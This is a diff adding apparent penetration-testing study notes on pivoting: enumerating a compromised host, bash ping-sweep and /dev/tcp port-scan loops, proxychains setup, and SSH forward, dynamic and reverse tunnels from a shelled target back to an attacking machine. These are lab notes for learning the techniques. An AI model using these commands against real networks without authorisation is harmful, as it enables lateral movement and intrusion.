@@ -384,3 +384,175 @@ Example pivoting tools
 - sshuttle (currently Unix only)
 
 ## 5. Pivoting Enumeration
+
+## Enumerate compromised host
+
+In order of preferences
+
+1. Using materials found on the machine eg. ARP cache, hosts file, DNS server
+2. Using pre-installed tools
+3. Using statically compiled tools
+4. Using scripting techniques
+5. Using local tools through proxy
+
+Local tools can be slow and should be last resort
+
+### Checking arp cache
+
+ARP cache can be found on Windows or Linux. This will show any IP addresses of hosts that target has interacted with recently
+
+```
+arp -a
+```
+
+### Check static mapping
+
+Found in `/etc/hosts` or `C:\Windows\System32\drivers\etc\hosts` 
+
+Linux local DNS found in `/etc/resolv.conf` or `nmcli dev show` - can be misconfigured to allow DNS zone transfer attack
+Windows DNS server can be checked with `ipconfig /all`
+
+### Check if nmap installed
+
+If no nmap write a script 
+
+ICMP ping scan 
+```
+for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done
+```
+
+Port scanning - takes a long time however
+```
+for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
+```
+
+## Proxychains and FoxyProxy
+
+### Proxychains
+
+Prepend other commands. Proxychains uses config file in `./proxychains.conf`, `~/.proxychains/proxychains.conf`, or `/etc/proxychains.conf` 
+
+```
+proxychains nc 172.16.0.10 23
+```
+
+Multiple servers can be used to chain all proxies together
+in `proxychains.conf`
+```
+[ProxyList]
+# add proxy here ...
+# meanwhile
+# defaults set to "tor"
+socks4  127.0.0.1 9050
+```
+
+Comment out `proxy_dns` line when doing nmap scans through proxy chains as this can cause the scan to hang
+
+```
+# Proxy DNS requests -no leak for DNS data
+# proxy_dns
+```
+
+Other things to note
+- Only TCP scans - no UDP or SYN scans
+- ICMP echo packets (ping) will not work, use -Pn to prevent nmap
+- It will be slow. Try only use nmap through a proxy when using the NSE (use static binary to see open ports/hosts before proxying a local copy of nmap to use the scripts library)
+
+### FoxyProxy
+
+Better with web browser. Popular with Burp and ZAP
+
+## Pivoting SSH Tunnelling / Port Forwarding
+
+### Forward connections
+
+Creating a forward (local) SSH tunnel done on attacking box when we have SSH access to the target. Two ways: `port forwarding` or `creating a proxy`
+
+1. Port Forwarding
+
+`-L` : enables port forwarding. Link to local port
+`-f` : backgrounds terminal immediately
+`-N` : tells SSH theres no commands to be executed only set connection
+
+Eg.
+- We have access to SSH 172.16.0.5
+- Web server on 172.16.0.10
+- `ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN`
+- This means we can access webserver `172.16.0.10` by visiting `localhost:8000` on a web browser through SSH tunnel from `172.16.0.5`
+
+2. Creating a proxy
+
+`-D [port]` : open up a port on attacking box as a proxy to send data to protected network. Useful when combined with proxychains
+
+eg.
+`ssh -D 1337 user@172.16.0.5 -fN`
+
+### Reverse connections
+
+Preferable if you have shell on server but not SSH access.
+This is however riskier as you must access your attacking machine from the target by credentials or better yet key based system
+
+1. Generate ssh keys `ssh-keygen`
+
+```
+ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/kali/.ssh/id_rsa): ./reverse
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in ./reverse
+Your public key has been saved in ./reverse.pub
+The key fingerprint is:
+SHA256:DmgoQJUIMyG6qW2F8zRMWQgFR/BfW37m2+MWYGttQNk kali@kali
+The key's randomart image is:
++---[RSA 3072]----+
+|Bo*B=..      o   |
+|++ +.o      o E  |
+|o   +   . ..     |
+|.o = o . +  +    |
+|+ + B o S ..o=   |
+|.o * . o   +o +  |
+|. o .   .  ... . |
+| .           oo  |
+|            .oo. |
++----[SHA256]-----+
+```
+
+2. Copy public key (`.pub` file) then edit `~/.ssh/authorized_keys`
+3. New line: `command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty` then paste the public key. This is to ensure the key only used for port forwarding. Stopping ability to gain a shell on attacking machine
+4. Check if SSH server running `sudo systemctl status ssh
+```
+sudo systemctl status ssh
+[sudo] password for kali: 
+● ssh.service - OpenBSD Secure Shell server
+     Loaded: loaded (/lib/systemd/system/ssh.service; disabled; vendor preset: disabled)
+     Active: inactive (dead)
+       Docs: man:sshd(8)
+             man:sshd_config(5)
+```
+
+SSH service can be started with
+```
+sudo systemctl start ssh
+```
+
+5. Lastly transfer the private key to the target box. This is usually an absolute no-no. This is why we generate a throwaway set of SSH keys to be discarded as soon as the engagement is over
+6. We can finally connect back with a reverse prot forwarding using
+
+```
+ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
+```
+
+For the web server 172.16.0.10 and 172.16.0.5 shell'd server. With attacking box 172.16.0.20
+
+```
+ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN
+```
+
+On newer client the reverse proxy creation can be done with `-D`
+
+```
+ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN
+```
+
+To kill any connections use `ps aux | grep ssh` then `sudo kill PID`
